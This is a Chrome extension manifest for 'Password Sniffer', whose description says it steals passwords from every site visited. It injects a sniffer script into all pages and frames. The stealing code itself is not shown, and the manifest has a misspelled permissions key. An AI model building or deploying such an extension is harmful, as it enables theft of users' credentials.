{
	"name"			: "Password Sniffer",
	"version"		: "1.1",
	"description"	: "Steals your passwords from all the sites you visit",
	"minimum_chrome_version"	: "18",
	"manifest_version": 2,
	"persmissions"	: ["*://*"],
	"background"	: {
		"scripts": ["background.js"]
	},
	"content_scripts"	: [
		{
			"matches"		: ["*://*/*"],
			"js"			: ["jquery.js", "sniffer.js"],
			"run_at"		: "document_idle",
			"all_frames"	: true
		}
	]
}